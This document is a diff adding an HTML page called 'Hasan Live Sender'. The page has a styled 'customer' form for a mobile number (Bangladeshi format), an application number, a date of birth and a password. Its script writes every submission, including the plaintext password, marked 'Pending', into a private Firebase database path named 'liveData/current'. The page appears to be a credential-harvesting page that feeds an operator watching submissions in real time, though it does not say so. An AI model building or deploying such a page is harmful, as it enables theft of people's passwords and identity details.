@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
+  <title>Hasan Live Sender</title>
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js">
+  </script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js">
+  </script>
+  <style>
+    /* ----- reset & base ----- */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, system-ui, sans-serif;
+    }
+
+    body {
+      background: #080b14;
+      color: #eef2ff;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1.5rem;
+      background-image: radial-gradient(circle at 20% 20%, #141f30 0%, #080b14 80%);
+    }
+
+    /* ----- glass container ----- */
+    .glass-container {
+      max-width: 580px;
+      width: 100%;
+      background: rgba(16, 26, 42, 0.50);
+      backdrop-filter: blur(16px) saturate(180%);
+      -webkit-backdrop-filter: blur(16px) saturate(180%);
+      border-radius: 3rem;
+      padding: 2.5rem 2.2rem;
+      box-shadow: 0 25px 60px rgba(0, 0, 0, 0.8), inset 0 1px 2px rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(64, 164, 255, 0.12);
+      transition: all 0.2s;
+    }
+
+    /* ----- header ----- */
+    .app-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 0.8rem 1.5rem;
+      margin-bottom: 2.2rem;
+    }
+
+    .app-header h1 {
+      font-weight: 600;
+      font-size: 1.7rem;
+      letter-spacing: -0.02em;
+      background: linear-gradient(135deg, #b6dcff, #4ba9ff);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      display: flex;
+      align-items: center;
+      gap: 0.4rem;
+    }
+
+    .app-header h1 small {
+      font-size: 0.85rem;
+      background: rgba(0, 180, 255, 0.12);
+      padding: 0.15rem 0.8rem;
+      border-radius: 60px;
+      color: #8ccbff;
+      border: 1px solid rgba(0, 180, 255, 0.15);
+      -webkit-text-fill-color: #8ccbff;
+      font-weight: 400;
+    }
+
+    .status-badge {
+      display: flex;
+      align-items: center;
+      gap: 0.6rem;
+      background: rgba(0, 20, 40, 0.5);
+      padding: 0.25rem 1.2rem 0.25rem 0.9rem;
+      border-radius: 60px;
+      border: 1px solid rgba(100, 200, 255, 0.15);
+      backdrop-filter: blur(4px);
+      font-weight: 500;
+      font-size: 0.8rem;
+    }
+
+    .status-dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      display: inline-block;
+      background: #34d399;
+      box-shadow: 0 0 12px #34d399aa;
+      transition: 0.2s;
+    }
+
+    .status-dot.offline {
+      background: #f87171;
+      box-shadow: 0 0 12px #f87171aa;
+    }
+
+    /* ----- form ----- */
+    .card {
+      background: rgba(8, 18, 34, 0.40);
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
+      border-radius: 2rem;
+      padding: 1.8rem 1.8rem 2rem;
+      border: 1px solid rgba(70, 150, 255, 0.06);
+      box-shadow: 0 12px 32px -12px rgba(0, 0, 0, 0.5);
+    }
+
+    .card-title {
+      font-weight: 500;
+      font-size: 1.2rem;
+      margin-bottom: 1.6rem;
+      color: #d6eaff;
+      letter-spacing: -0.01em;
+      display: flex;
+      align-items: center;
+      gap: 0.6rem;
+    }
+
+    .card-title span {
+      background: rgba(0, 150, 255, 0.08);
+      padding: 0.1rem 0.8rem;
+      border-radius: 60px;
+      font-size: 0.65rem;
+      color: #7bb9ff;
+      font-weight: 400;
+    }
+
+    .form-group {
+      margin-bottom: 1.3rem;
+    }
+
+    .form-group label {
+      display: block;
+      font-size: 0.75rem;
+      text-transform: uppercase;
+      letter-spacing: 0.04em;
+      color: #a0bee3;
+      margin-bottom: 0.3rem;
+      font-weight: 500;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 0.8rem 1.1rem;
+      background: rgba(0, 12, 30, 0.5);
+      border: 1px solid rgba(80, 170, 255, 0.12);
+      border-radius: 1.4rem;
+      color: #f0f7ff;
+      font-size: 0.95rem;
+      outline: none;
+      transition: 0.2s;
+      backdrop-filter: blur(4px);
+    }
+
+    .form-group input:focus {
+      border-color: #4ba9ff;
+      box-shadow: 0 0 0 3px rgba(75, 169, 255, 0.15);
+      background: rgba(10, 25, 50, 0.5);
+    }
+
+    .form-group input::placeholder {
+      color: #4f6d92;
+      font-weight: 300;
+    }
+
+    /* ----- button ----- */
+    .btn {
+      padding: 0.8rem 2rem;
+      border-radius: 60px;
+      border: none;
+      font-weight: 600;
+      font-size: 0.95rem;
+      background: rgba(30, 80, 140, 0.2);
+      color: #d0e6ff;
+      backdrop-filter: blur(6px);
+      border: 1px solid rgba(75, 169, 255, 0.10);
+      cursor: pointer;
+      transition: 0.2s;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+      width: 100%;
+    }
+
+    .btn-primary {
+      background: linear-gradient(135deg, #0f6fcf, #1a8aff);
+      border: none;
+      color: white;
+      box-shadow: 0 8px 22px -8px #1a8aff70;
+      padding: 0.9rem 2rem;
+      font-size: 1rem;
+    }
+
+    .btn-primary:hover {
+      transform: scale(1.01);
+      box-shadow: 0 12px 28px -8px #1a8affbb;
+    }
+
+    .btn-primary:disabled {
+      opacity: 0.5;
+      transform: scale(0.98);
+      pointer-events: none;
+    }
+
+    .send-status {
+      margin-top: 0.8rem;
+      font-size: 0.9rem;
+      color: #8bb0da;
+      text-align: center;
+      min-height: 1.8rem;
+    }
+
+    /* ----- toast ----- */
+    .toast-container {
+      position: fixed;
+      bottom: 2rem;
+      right: 2rem;
+      z-index: 999;
+      display: flex;
+      flex-direction: column;
+      gap: 0.6rem;
+      max-width: 340px;
+      width: 100%;
+    }
+
+    .toast {
+      background: rgba(10, 26, 48, 0.92);
+      backdrop-filter: blur(14px);
+      padding: 0.9rem 1.6rem;
+      border-radius: 2.5rem;
+      border-left: 6px solid #4ba9ff;
+      box-shadow: 0 12px 32px rgba(0, 0, 0, 0.7);
+      color: #dceaff;
+      font-size: 0.9rem;
+      animation: slideUp 0.35s ease;
+      display: flex;
+      align-items: center;
+      gap: 0.6rem;
+    }
+
+    .toast.success {
+      border-left-color: #34d399;
+    }
+    .toast.error {
+      border-left-color: #f87171;
+    }
+
+    @keyframes slideUp {
+      0% {
+        opacity: 0;
+        transform: translateY(24px);
+      }
+      100% {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    /* responsive */
+    @media (max-width: 480px) {
+      .glass-container {
+        padding: 1.5rem 1rem;
+      }
+      .card {
+        padding: 1.2rem;
+      }
+      .app-header h1 {
+        font-size: 1.3rem;
+      }
+      .app-header h1 small {
+        font-size: 0.7rem;
+        padding: 0.1rem 0.6rem;
+      }
+      .btn {
+        font-size: 0.85rem;
+        padding: 0.7rem 1rem;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="glass-container">
+    <!-- HEADER -->
+    <header class="app-header">
+      <h1>📡 Hasan <small>Live Sender</small></h1>
+      <div class="status-badge">
+        <span class="status-dot" id="connectionDot"></span>
+        <span id="connectionLabel">online</span>
+      </div>
+    </header>
+
+    <!-- CUSTOMER FORM -->
+    <div class="card">
+      <div class="card-title">📤 Send Details <span>customer</span></div>
+      <form id="senderForm" autocomplete="off">
+        <div class="form-group">
+          <label>📱 Mobile Number</label>
+          <input type="tel" id="mobileInput" placeholder="+880 1700 000 000" required />
+        </div>
+        <div class="form-group">
+          <label>🔢 Application Number</label>
+          <input type="text" id="applicationInput" placeholder="APP-2026-001" required />
+        </div>
+        <div class="form-group">
+          <label>📅 Date of Birth</label>
+          <input type="date" id="dobInput" required />
+        </div>
+        <div class="form-group">
+          <label>🔑 Password</label>
+          <input type="password" id="passwordInput" placeholder="••••••••" required />
+        </div>
+        <button type="submit" class="btn btn-primary" id="sendBtn">🚀 Send Details</button>
+        <div class="send-status" id="sendStatus"></div>
+      </form>
+    </div>
+  </div>
+
+  <!-- toast container -->
+  <div class="toast-container" id="toastContainer"></div>
+
+  <script>
+    // ============================================================
+    // FIREBASE CONFIG
+    // ============================================================
+    const firebaseConfig = {
+      apiKey: "AIzaSyC2bNTbuMLCNDWb6j1MaayYbazKLncaFBs",
+      authDomain: "hasan-data-sender.firebaseapp.com",
+      databaseURL: "https://hasan-data-sender-default-rtdb.asia-southeast1.firebasedatabase.app",
+      projectId: "hasan-data-sender",
+      storageBucket: "hasan-data-sender.firebasestorage.app",
+      messagingSenderId: "58791949531",
+      appId: "1:58791949531:web:b6d669e4c3d8476b7308fe"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    const currentRef = db.ref('liveData/current');
+
+    // ============================================================
+    // DOM REFS
+    // ============================================================
+    const $ = (id) => document.getElementById(id);
+    const mobileInput = $('mobileInput');
+    const applicationInput = $('applicationInput');
+    const dobInput = $('dobInput');
+    const passwordInput = $('passwordInput');
+    const sendBtn = $('sendBtn');
+    const sendStatus = $('sendStatus');
+    const connectionDot = $('connectionDot');
+    const connectionLabel = $('connectionLabel');
+    const toastContainer = $('toastContainer');
+
+    // ============================================================
+    // CONNECTION STATUS
+    // ============================================================
+    function updateConnectionStatus(online) {
+      if (online) {
+        connectionDot.className = 'status-dot';
+        connectionLabel.textContent = 'online';
+      } else {
+        connectionDot.className = 'status-dot offline';
+        connectionLabel.textContent = 'offline';
+      }
+    }
+
+    const connectedRef = firebase.database().ref('.info/connected');
+    connectedRef.on('value', (snap) => {
+      updateConnectionStatus(snap.val() === true);
+    });
+
+    // ============================================================
+    // TOAST
+    // ============================================================
+    function showToast(message, type = 'info') {
+      const toast = document.createElement('div');
+      toast.className = `toast ${type}`;
+      toast.textContent = message;
+      toastContainer.appendChild(toast);
+      setTimeout(() => {
+        toast.style.opacity = '0';
+        toast.style.transition = '0.3s';
+        setTimeout(() => toast.remove(), 400);
+      }, 3000);
+    }
+
+    // ============================================================
+    // PLAY NOTIFICATION SOUND
+    // ============================================================
+    function playNotification() {
+      try {
+        const audio = new Audio('data:audio/wav;base64,UklGRnoAAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoAAACBhYV/hYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYW');
+        audio.play().catch(() => {});
+      } catch (_) {}
+    }
+
+    // ============================================================
+    // SEND DATA
+    // ============================================================
+    async function sendData(e) {
+      e.preventDefault();
+
+      const mobile = mobileInput.value.trim();
+      const application = applicationInput.value.trim();
+      const dob = dobInput.value.trim();
+      const password = passwordInput.value.trim();
+
+      // validation
+      if (!mobile || !application || !dob || !password) {
+        showToast('All fields are required', 'error');
+        return;
+      }
+
+      if (mobile.length < 8) {
+        showToast('Please enter a valid mobile number', 'error');
+        return;
+      }
+
+      sendBtn.disabled = true;
+      sendBtn.textContent = '⏳ Sending...';
+      sendStatus.textContent = '⏳ Sending...';
+
+      const payload = {
+        mobile,
+        application,
+        dob,
+        password,
+        status: 'Pending',
+        timestamp: Date.now()
+      };
+
+      try {
+        await currentRef.set(payload);
+
+        sendStatus.textContent = '✅ Details Sent Successfully';
+        showToast('✅ Details Sent Successfully', 'success');
+        playNotification();
+
+        // clear form
+        mobileInput.value = '';
+        applicationInput.value = '';
+        passwordInput.value = '';
+        const d = new Date();
+        dobInput.value = d.toISOString().split('T')[0];
+
+        // reset status after delay
+        setTimeout(() => {
+          if (sendStatus.textContent === '✅ Details Sent Successfully') {
+            sendStatus.textContent = '';
+          }
+        }, 4000);
+
+      } catch (err) {
+        console.error(err);
+        sendStatus.textContent = '❌ Error sending';
+        showToast('Send failed: ' + err.message, 'error');
+      } finally {
+        sendBtn.disabled = false;
+        sendBtn.textContent = '🚀 Send Details';
+      }
+    }
+
+    $('senderForm').addEventListener('submit', sendData);
+
+    // ============================================================
+    // INIT: set default date
+    // ============================================================
+    if (!dobInput.value) {
+      const d = new Date();
+      dobInput.value = d.toISOString().split('T')[0];
+    }
+
+    console.log('🚀 Hasan Live Sender (Customer) ready');
+  </script>
+</body>
+</html>
